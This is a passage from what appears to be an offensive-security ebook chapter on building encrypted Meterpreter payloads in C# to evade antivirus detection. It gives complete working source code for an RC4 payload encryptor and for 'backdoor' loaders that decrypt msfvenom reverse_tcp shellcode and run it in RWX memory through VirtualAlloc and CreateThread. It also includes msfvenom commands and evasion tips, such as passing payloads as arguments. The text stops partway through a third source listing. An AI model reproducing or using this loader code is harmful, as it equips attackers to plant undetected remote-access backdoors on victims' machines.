0x40;\n\r\n\r \n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Bingo Meterpreter session ;)\");\n\r\n\r \n\r\n\r            UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)result__payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r            Marshal.Copy(result__payload, 0x00000000, (IntPtr)(funcAddr), result__payload.Length);\n\r\n\r \n\r\n\r            IntPtr hThread = IntPtr.Zero;\n\r\n\r            UInt32 threadId = 0;\n\r\n\r            IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r            WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r        }\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);      \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}","","topics\\Chapter 13.html","\n\r\n\rChapter 2 : Making Encrypted Meterpreter Payload by C#.NET \n\r\n\r\n\r•Goal : Understanding how can Create Encrypted Payload and Decrypt that in Memory by C# \n\r\n\r\n\r•Creating C#.NET Code and Testing. \n\r\n\r\n\r•Videos \n\r\n\r\n\r \n\r\n\rin this Chapter we will talk about Encrypting Meterpreter Payload in your Source Code by C# so in this case we want to Hard-coded Payload Again in C# Source Code then for Avoiding from Detection by AV we will use Encrypted Meterpreter Payload in our Code but we have some Important Points in this Section :\n\r\n\rImportant Points :\n\r\n\r\n\r1.Where of your Code is Sensitive and probably will Detect by Anti-Viruses ? \n\r\n\r\n\r\n\r\n\r◦◦Meterpreter Section ? It means AV will Detect your Meterpreter Hard-coded Payload in Executable file as you can see in previous Chapter we talked about that ?  like these Sections  : \n\r\n\r\n\r\n\rbyte[] X_Final = new byte[] { 0xfc ,0x48 ,0x83 ,0xe4 ,0xf0 ,0xe8 ,0xcc ,0x00 ...};\n\r\n\rstring payload = \"fc,48,83,e4,f0,e8,cc,00,00,...\";\n\r\n\r\n\r\n\r◦◦Or Other Sections of your C# code ? like these Sections : ( S1 , S2 or STEP2: Since “Begin” up to “End” ) : \n\r\n\r\n\r\n\r            /// STEP 2: Begin\n\r\n\r            UInt32 MEM_COMMIT = 0x1000;\n\r\n\r            UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Bingo Meterpreter session by Hardcoded Payload with strings ;)\");\n\r\n\r  S1      UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);\n\r\n\r            IntPtr hThread = IntPtr.Zero;\n\r\n\r            UInt32 threadId = 0x0000;\n\r\n\r            IntPtr pinfo = IntPtr.Zero;\n\r\n\r   S2     hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r            WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            /// STEP 2: End\n\r\n\r \n\r\n\r\n\r2.in this chapter we will talk about Hard-coded Payloads but one good way to avoiding Detection by AV is Using Command Prompt Parameters for Importing your Payloads as Parameter! In this case your Payloads will load in Memory without Writing in File-system also you can Use Encrypted Data by CMD Parameters for Importing Payloads so we should talk about this technique too because some Anti-viruses will Detect Meterpreter Sections in your C# Code so in this case you should not use Hard-coded Meterpreter Payload in Executable file or Source code so you can Import your Meterpreter by Command Prompt Parameters or you should use Hard-coded + Encrypted Payload. \n\r\n\r\n\r \n\r\n\r\n\r\n\r◦◦Note : you can use Infiltration/Exfiltration Techniques for Transferring Payloads over Network Traffic also use them as Command Prompt Parameter for your Backdoor , in this course we will talk about Infiltration /Exfiltration Techniques too. (eBook PART2) \n\r\n\r\n\r\n\r \n\r\n\r\n\r3.Some Anti-viruses will Detect Sections S1 , S2 or STEP2 since Begin up to End so in this case you should change your C# Source Code for Making New Signature . \n\r\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rIn this chapter we will talk about how can use Hard-coded Payload with Encryption Method also we will talk about How can use Payloads by Command Prompt Parameters via C#.\n\r\n\r \n\r\n\rNote : RC4 is one of the Best and Simple way for using Encryption in your Meterpreter Payloads so I want to use this Algorithm for Encrypted Payloads but in this course I do not want to Explain RC4 Algorithm Code Line by Line so we just need these codes for Encryption but I think this Source Code is not Very Difficult to Understanding so we should Focus to How can Use this Code in C# rather than the focus to RC4 Algorithm. \n\r\n\r \n\r\n\rWarning : Don\'t Use \"www.virustotal.com\" or something like that , Never Ever.\n\r\n\rRecommended : \n\r\n\rSTEP 1 : Use each Installed AV one by one in your LAB .\n\r\n\rSTEP 2 : after \"AV Signature Database Updated\" your Internet Connection should be \"Disconnect\" .\n\r\n\rSTEP 3 : Now you can Copy and Paste your C# code and “exe” to your Virtual Machine for test .\n\r\n\r \n\r\n\r \n\r\n\rAs you can see in this code “ class Encryption_Class ”  we have “Encrypt , Decrypt” Functions so with these functions you can Create Encrypt or Decrypt Payload.\n\r\n\r \n\r\n\r        private static class Encryption_Class\n\r\n\r        {\n\r\n\r            public static string Encrypt(string key, string data)\n\r\n\r            {\n\r\n\r                Encoding unicode = Encoding.Unicode;\n\r\n\r                return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));\n\r\n\r            }\n\r\n\r \n\r\n\r            public static string Decrypt(string key, string data)\n\r\n\r            {\n\r\n\r                Encoding unicode = Encoding.Unicode;\n\r\n\r                return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));\n\r\n\r            }\n\r\n\r \n\r\n\r            public static byte[] Encrypt(byte[] key, byte[] data)\n\r\n\r            {\n\r\n\r                return EncryptOutput(key, data).ToArray();\n\r\n\r            }\n\r\n\r \n\r\n\r            public static byte[] Decrypt(byte[] key, byte[] data)\n\r\n\r            {\n\r\n\r                return EncryptOutput(key, data).ToArray();\n\r\n\r            }\n\r\n\r \n\r\n\r            private static byte[] EncryptInitalize(byte[] key)\n\r\n\r            {\n\r\n\r                byte[] s = Enumerable.Range(0, 256)\n\r\n\r                  .Select(i =&gt; (byte)i)\n\r\n\r                  .ToArray();\n\r\n\r \n\r\n\r                for (int i = 0, j = 0; i &lt; 256; i++)\n\r\n\r                {\n\r\n\r                    j = (j + key[i % key.Length] + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                    Swap(s, i, j);\n\r\n\r                }\n\r\n\r \n\r\n\r                return s;\n\r\n\r            }\n\r\n\r \n\r\n\r            private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)\n\r\n\r            {\n\r\n\r                byte[] s = EncryptInitalize(key);\n\r\n\r \n\r\n\r                int i = 0;\n\r\n\r                int j = 0;\n\r\n\r \n\r\n\r                return data.Select((b) =&gt;\n\r\n\r                {\n\r\n\r                    i = (i + 1) &amp; 255;\n\r\n\r                    j = (j + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                    Swap(s, i, j);\n\r\n\r                    return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);\n\r\n\r                });\n\r\n\r            }\n\r\n\r \n\r\n\r            private static void Swap(byte[] s, int i, int j)\n\r\n\r            {\n\r\n\r                byte c = s[i];\n\r\n\r                s[i] = s[j];\n\r\n\r                s[j] = c;\n\r\n\r            }\n\r\n\r        }\n\r\n\r \n\r\n\rfor using RC4 encryption Code in your C# Backdoor you need Two Steps :\n\r\n\r \n\r\n\rStep1: Creating Encrypted Payloads by Simple C# Code.\n\r\n\rStep2: Creating Decrypted Payloads by Simple C# Backdoor.\n\r\n\r \n\r\n\rSo we have two C# Source code first for Encryption , Second for Decryption (Backdoor). \n\r\n\r \n\r\n\rStep1: Creating Encrypted Payloads by Simple C# Code:\n\r\n\r \n\r\n\rStep1-1: First of all we need one Meterpreter Payload so with this command you can Create Meterpreter Payload with Csharp Format.\n\r\n\rStep1-1: Creating Metasploit Meterpreter Backdoor Payloads. (Transform Format : csharp)\n\r\n\rFor creating Native Code or Unmanaged Code for your Backdoor Payload you can use this Command with this syntax :\n\r\n\rmsfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp  lhost=192.168.56.1 -f csharp &gt; payload.txt\n\r\n\r \n\r\n\rNote : After create Meterpreter payload by Msfvenom Command you can use this Payload by This C# Source Code for Creating Encrypted Payload .\n\r\n\r \n\r\n\rbefore using this C# Source Code we should talk about static byte[] KEY  for Encryption method also we should talk about this code string[] InputArg = args[0].Split(\',\'); for Using Command Prompt Arguments to importing Meterpreter Payload .\n\r\n\rSource_1:\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace Payload_Encrypt_Maker\n\r\n\r{ \n\r\n\r class Program\n\r\n\r    {\n\r\n\r        static byte[] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };\n\r\n\r       \n\r\n\r      \n\r\n\r        private static class Encryption_Class\n\r\n\r        {\n\r\n\r            public static string Encrypt(string key, string data)\n\r\n\r            {\n\r\n\r                Encoding unicode = Encoding.Unicode;\n\r\n\r                return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));\n\r\n\r            }\n\r\n\r \n\r\n\r            public static string Decrypt(string key, string data)\n\r\n\r            {\n\r\n\r                Encoding unicode = Encoding.Unicode;\n\r\n\r                return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));\n\r\n\r            }\n\r\n\r \n\r\n\r            public static byte[] Encrypt(byte[] key, byte[] data)\n\r\n\r            {\n\r\n\r                return EncryptOutput(key, data).ToArray();\n\r\n\r            }\n\r\n\r \n\r\n\r            public static byte[] Decrypt(byte[] key, byte[] data)\n\r\n\r            {\n\r\n\r                return EncryptOutput(key, data).ToArray();\n\r\n\r            }\n\r\n\r \n\r\n\r            private static byte[] EncryptInitalize(byte[] key)\n\r\n\r            {\n\r\n\r                byte[] s = Enumerable.Range(0, 256)\n\r\n\r                  .Select(i =&gt; (byte)i)\n\r\n\r                  .ToArray();\n\r\n\r \n\r\n\r                for (int i = 0, j = 0; i &lt; 256; i++)\n\r\n\r                {\n\r\n\r                    j = (j + key[i % key.Length] + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                    Swap(s, i, j);\n\r\n\r                }\n\r\n\r \n\r\n\r                return s;\n\r\n\r            }\n\r\n\r \n\r\n\r            private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)\n\r\n\r            {\n\r\n\r                byte[] s = EncryptInitalize(key);\n\r\n\r \n\r\n\r                int i = 0;\n\r\n\r                int j = 0;\n\r\n\r \n\r\n\r                return data.Select((b) =&gt;\n\r\n\r                {\n\r\n\r                    i = (i + 1) &amp; 255;\n\r\n\r                    j = (j + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                    Swap(s, i, j);\n\r\n\r \n\r\n\r                    return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);\n\r\n\r                });\n\r\n\r            }\n\r\n\r \n\r\n\r            private static void Swap(byte[] s, int i, int j)\n\r\n\r            {\n\r\n\r                byte c = s[i];\n\r\n\r \n\r\n\r                s[i] = s[j];\n\r\n\r                s[j] = c;\n\r\n\r            }\n\r\n\r        }\n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine(\"Payload Encryptor tool for Meterpreter Payloads \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher  2016-2017\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine(\"[!] using RC4 Encryption for your Payload with strings\");            \n\r\n\r            \n\r\n\r \n\r\n\r            string[] InputArg = args[0].Split(\',\');\n\r\n\r            byte[] XPay = new byte[InputArg.Length];\n\r\n\r \n\r\n\r            Console.WriteLine(\"[!] Detecting Meterpreter Payload by Arguments\");\n\r\n\r            Console.Write(\"[!] Payload Length is: \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r            Console.Write(XPay.Length.ToString() + \"\\n\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r \n\r\n\r            for (int i = 0; i &lt; XPay.Length; i++)\n\r\n\r            {\n\r\n\r                XPay[i] = Convert.ToByte(InputArg[i], 16);\n\r\n\r            }\n\r\n\r \n\r\n\r            Console.WriteLine(\"[!] Loading Meterpreter Payload in Memory Done.\");\n\r\n\r \n\r\n\r            byte[] Xresult = Encryption_Class.Encrypt(KEY, XPay);\n\r\n\r            Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r            Console.WriteLine(\"[&gt;] Encrypting Meterpreter Payload in Memory by KEY Done.\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.Write(\"[!] Encryption KEY is:\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r \n\r\n\r            string Keys = \"\";\n\r\n\r            foreach (byte item in KEY)\n\r\n\r            {\n\r\n\r                Keys += \" \" + item.ToString();\n\r\n\r            }\n\r\n\r \n\r\n\r            Console.Write(\"{0}\", Convert.ToString(Keys));\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[+] Encrypted Payload with Length {0} is: \",XPay.Length.ToString());\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r            \n\r\n\r            for (int i = 0; i &lt; Xresult.Length; i++)\n\r\n\r            {                 \n\r\n\r                Console.Write(\" \" + Xresult[i].ToString());\n\r\n\r            }\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine();\n\r\n\r \n\r\n\r        }\n\r\n\r    }\n\r\n\r}\n\r\n\r \n\r\n\rQ. What is this KEY ?\n\r\n\rA. Short Answer is : you need this KEY to Encrypting your Payload by RC4 Algorithm also you need this KEY for Decryption .   \n\r\n\rThis KEY is Byte[] Array variable and this Key Hard-coded in your Code but you can change it any time you want .\n\r\n\r \n\r\n\rstatic byte[] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rimporting Data with Arguments :\n\r\n\r \n\r\n\r1.you can import this KEY to your Code via Command Prompt Arguments but in this case I did not use this Technique .\n\r\n\r \n\r\n\r2.for importing Meterpreter Payload via Command Prompt Arguments I used this code to do this .\n\r\n\r \n\r\n\rstring[] InputArg = args[0].Split(\',\');\n\r\n\r \n\r\n\r \n\r\n\rso string[] InputArg = args[0] it means you want to dump First Argument in Command Prompt for this Tool .\n\r\n\r \n\r\n\rNow we should talk about this Trick for Importing DATA in this Case Meterpreter Payload to your Code via Args Variable.\n\r\n\r \n\r\n\rThis is your Meterpreter Payload with Transform Format Csharp by Msfvenom in (Step1-1)  and it should be something like this :\n\r\n\r \n\r\n\rroot@kali:~# msfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.111 -f csharp &gt; payload_cs.txt\n\r\n\rNo encoder or badchars specified, outputting raw payload\n\r\n\rPayload size: 510 bytes\n\r\n\rroot@kali:~# cat payload_cs.txt \n\r\n\rbyte[] buf = new byte[510] {\n\r\n\r0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,....,0xb5,0xa2,0x56,0xff,0xd5 };\n\r\n\r \n\r\n\r \n\r\n\rso we have something like these bytes in our Msfvenom Payloads :\n\r\n\r \n\r\n\r0xfc ,0x48 ,0x83 ,0xe4 ,0xf0 ,0xe8 ,0xcc ,0x00 ,0x00 ,0x00 ,0x41 ,0x51 ,0x41 ,0x50 ,0x52 ,0x51\n\r\n\r \n\r\n\r \n\r\n\rwith C# you can transform this string from this format “0xfc,0x48” to new String Array Variable with this Format 0xfc 0x48  \n\r\n\rso we have something like this by this simple C# Code string[] InputArg = args[0].Split(\',\') :\n\r\n\r \n\r\n\r\"0xfc ,0x48 ,0x83 ,0xe4 ,0xf0\"  == &gt;   InputArg[0]=  \"0xfc\"\n\r\n\r\"0xfc ,0x48 ,0x83 ,0xe4 ,0xf0\"  == &gt;   InputArg[1]=  \"0x48\"\n\r\n\r\"0xfc ,0x48 ,0x83 ,0xe4 ,0xf0\"  == &gt;   InputArg[2]=  \"0x83\"\n\r\n\r\"0xfc ,0x48 ,0x83 ,0xe4 ,0xf0\"  == &gt;   InputArg[3]=  \"0xe4\"\n\r\n\r\"0xfc ,0x48 ,0x83 ,0xe4 ,0xf0\"  == &gt;   InputArg[4]=  \"0xf0\"\n\r\n\r \n\r\n\ras you can see in  “Picture 1” with this Code you can import Meterpreter Payload by Command Prompt Argument to         string[] InputArg variable very simple and this Meterpreter Payload Made by Msfvenom Command (step1-1).\n\r\n\r  \n\r\n\rAfter run this Code you will have something like this “Picture2” \n\r\n\rPicture2:\n\r\n\ras you can see in Picture2 we have Encrypted Meterpreter Payload by Decimal values and this Payload Encrypted by your Hard-coded KEY in this case your KEY is “0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00“ .\n\r\n\r \n\r\n\rnow we should use this Encrypted Payload in target system for bypassing AV Detection by simple C# Backdoor Code also you need this KEY for Decrypting this Meterpreter Payload in Target system Memory and Executing this. As I said we talk about Those Anti-viruses which will detect our Meterpreter Payloads in Source Code or Executable File (File-system) so with Step1 we had Simple C# code for Encrypting this Meterpreter Payload also for Hard-coding this Encrypted Payload in our Executable File but we can Use Command Prompt Arguments for Importing this Payload into our Backdoor too (maybe Safe-way).\n\r\n\r \n\r\n\rSo we have two C# Source code first for Encryption (step1) , Second for Decryption (step2).\n\r\n\r \n\r\n\rStep2: Creating Decrypted Payloads via Simple C# Backdoor.\n\r\n\r \n\r\n\rIn this Step2 you need Simple C# Code for Decrypting this Meterpreter Payload in Memory and Executing that at the same time so again we can use our Simple C# Backdoor Code from Chapter 1 but with Little Bit change in Source code for Decryption .\n\r\n\r \n\r\n\rThis is Chapter 1 Backdoor Code with little bit change for Decrypting Payload.\n\r\n\rSource_2:\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_Decryption\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r       \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine(\"Payload Decryption tool for Meterpreter Payloads \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher  2016-2017\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine(\"[!] Using RC4 Decryption for your Payload By KEY.\");\n\r\n\r            string Payload_Encrypted;\n\r\n\r            \n\r\n\r            string[] Input_Keys = args[0].Split(\' \');\n\r\n\r            byte[] xKey = new byte[Input_Keys.Length];\n\r\n\r \n\r\n\r            Console.Write(\"[!] Decryption KEY is : \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r            /// Converting String to Byte for KEY by first Argument\n\r\n\r            for (int i = 0; i &lt; Input_Keys.Length; i++)\n\r\n\r            {\n\r\n\r                xKey[i] = Convert.ToByte(Input_Keys[i], 16);\n\r\n\r                Console.Write(xKey[i].ToString(\"x2\") + \" \");\n\r\n\r            }\n\r\n\r \n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r \n\r\n\r            /// Converting String to Byte for Encrypted Meterpreter Payload by Second Argument\n\r\n\r           \n\r\n\r            Payload_Encrypted = args[1].ToString();\n\r\n\r \n\r\n\r            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(\' \');\n\r\n\r \n\r\n\r            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];\n\r\n\r \n\r\n\r            for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)\n\r\n\r            {\n\r\n\r                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());\n\r\n\r                _X_to_Bytes[i] = current;\n\r\n\r            }\n\r\n\r            try\n\r\n\r            {\n\r\n\r               \n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"[!] Loading Encrypted Meterprter Payload in Memory Done.\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r \n\r\n\r                byte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);\n\r\n\r               \n\r\n\r                Console.WriteLine(\"[&gt;] Decrypting Meterprter Payload by KEY in Memory Done.\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by Encrypted Payload ;)\");\n\r\n\r \n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)Final_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(Final_Payload, 0, (IntPtr)(funcAddr), Final_Payload.Length);\n\r\n\r \n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            }\n\r\n\r            catch (Exception)\n\r\n\r            {\n\r\n\r \n\r\n\r                throw;\n\r\n\r            }\n\r\n\r \n\r\n\r        }\n\r\n\r \n\r\n\r        public static byte[] Decrypt(byte[] key, byte[] data)\n\r\n\r        {\n\r\n\r            return EncryptOutput(key, data).ToArray();\n\r\n\r        }\n\r\n\r        private static byte[] EncryptInitalize(byte[] key)\n\r\n\r        {\n\r\n\r            byte[] s = Enumerable.Range(0, 256)\n\r\n\r              .Select(i =&gt; (byte)i)\n\r\n\r              .ToArray();\n\r\n\r \n\r\n\r            for (int i = 0, j = 0; i &lt; 256; i++)\n\r\n\r            {\n\r\n\r                j = (j + key[i % key.Length] + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                Swap(s, i, j);\n\r\n\r            }\n\r\n\r \n\r\n\r            return s;\n\r\n\r        }\n\r\n\r        private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)\n\r\n\r        {\n\r\n\r            byte[] s = EncryptInitalize(key);\n\r\n\r \n\r\n\r            int i = 0;\n\r\n\r            int j = 0;\n\r\n\r \n\r\n\r            return data.Select((b) =&gt;\n\r\n\r            {\n\r\n\r                i = (i + 1) &amp; 255;\n\r\n\r                j = (j + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                Swap(s, i, j);\n\r\n\r \n\r\n\r                return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);\n\r\n\r            });\n\r\n\r        }\n\r\n\r        private static void Swap(byte[] s, int i, int j)\n\r\n\r        {\n\r\n\r            byte c = s[i];\n\r\n\r \n\r\n\r            s[i] = s[j];\n\r\n\r            s[j] = c;\n\r\n\r        }\n\r\n\r \n\r\n\r        private static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r \n\r\n\r    }\n\r\n\r}\n\r\n\r \n\r\n\rby this section of code you can Import KEY code for Decryption via first Command Prompt Argument . \n\r\n\r \n\r\n\r           \n\r\n\r           string[] Input_Keys = args[0].Split(\' \');\n\r\n\r            byte[] xKey = new byte[Input_Keys.Length];\n\r\n\r \n\r\n\r            Console.Write(\"[!] Decryption KEY is : \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r            /// Converting String to Byte for KEY by first Argument\n\r\n\r            for (int i = 0; i &lt; Input_Keys.Length; i++)\n\r\n\r            {\n\r\n\r                xKey[i] = Convert.ToByte(Input_Keys[i], 16);\n\r\n\r                Console.Write(xKey[i].ToString(\"x2\") + \" \");\n\r\n\r            }\n\r\n\r \n\r\n\rby this section of code you can Import your Encrypted Meterpreter code via second Command Prompt Argument .\n\r\n\r \n\r\n\r  /// Converting String to Byte for Encrypted Meterpreter Payload by Second Argument\n\r\n\r           \n\r\n\r            Payload_Encrypted = args[1].ToString();\n\r\n\r \n\r\n\r            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(\' \');\n\r\n\r \n\r\n\r            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];\n\r\n\r \n\r\n\r            for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)\n\r\n\r            {\n\r\n\r                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());\n\r\n\r                _X_to_Bytes[i] = current;\n\r\n\r            }\n\r\n\r \n\r\n\rfinally by this code you will have Decrypted Meterpreter Payload in Memory for Executing .\n\r\n\r \n\r\n\rbyte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);\n\r\n\r \n\r\n\ras you can see in “Picture3” with this Syntax my Backdoor Worked very simple .\n\r\n\r \n\r\n\rSyntax : NativePayload_Decryption.exe “KEY”  “Encrypted_Payload”\n\r\n\r  \n\r\n\runtil now we used Argument Technique for Importing KEY and Encrypted Payload to our Backdoor so in this case we have not   Hard-coded Meterpreter Payload in Source Code or Executable File but you can use Hard-coded KEY in source Code like this so you can use (Source_3) for this technique.\n\r\n\r  \n\r\n\rSource_3: code with Hard-coded KEY\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_Decryption\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r       \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine(\"Payload Decryption tool for Meterpreter Payloads \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher  2016-2017\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine(\"[!] Using RC4 Decryption for your Payload By KEY.\");\n\r\n\r            string Payload_Encrypted;\n\r\n\r \n\r\n\r            byte[] xKey = { 0x11,0x22,0x11,0x00,0x00,0x01,0xd0,0x00,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x11,0x01,0x11,0x11,0x00,0x00};\n\r\n\r \n\r\n\r            // string[] Input_Keys = args[0].Split(\' \');\n\r\n\r            // byte[] xKey = new byte[Input_Keys.Length];\n\r\n\r \n\r\n\r            Console.Write(\"[!] Decryption KEY is : \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r            /// Converting String to Byte for KEY by first Argument\n\r\n\r            // for (int i = 0; i &lt; Input_Keys.Length; i++)\n\r\n\r            // {\n\r\n\r             //   xKey[i] = Convert.ToByte(Input_Keys[i], 16);\n\r\n\r             //   